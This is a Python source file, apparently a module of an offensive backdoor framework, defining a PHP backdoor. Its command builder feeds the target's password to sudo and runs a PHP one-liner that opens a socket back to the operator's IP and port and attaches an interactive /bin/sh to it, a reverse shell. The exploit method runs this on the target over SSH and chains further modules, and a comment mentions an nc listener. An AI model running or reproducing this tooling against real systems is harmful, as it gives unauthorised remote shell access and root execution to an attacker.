from backdoors.backdoor import *

class Php(Backdoor):
    prompt = Fore.RED + "(php) " + Fore.BLUE + ">> " + Fore.RESET

    def __init__(self, core):
        cmd.Cmd.__init__(self)
        self.intro = GOOD + "Using php module..."
        self.core = core
        self.options = {
                "port"   : Option("port", 53930, "port to connect to", True),
                }
        self.allow_modules = True
        self.modules = {}
        self.help_text = INFO + "Creates and runs a php backdoor which sends output to bash.\n"+INFO+"It does not automatically install a web server, but instead uses the php web module." 

    def get_command(self):
        return "echo " + self.core.curtarget.pword + " | sudo -S php -r '$sock=fsockopen(\"" + self.core.localIP + "\"," + str(self.get_value("port")) + ");exec(\"/bin/sh -i <&3 >&3 2>&3\");'"

    def do_exploit(self, args):
        port = self.get_value("port")
        target = self.core.curtarget
        #input("Please enter the following command: nc -v -n -l -p %s in another shell to connect." % port)
        self.listen("none", "none")
        print(GOOD + "Initializing backdoor...")
        target.ssh.exec_command(self.get_command())
        for mod in self.modules.keys():
            print(INFO + "Attempting to execute " + mod.name + " module...")
            mod.exploit(self.get_command())
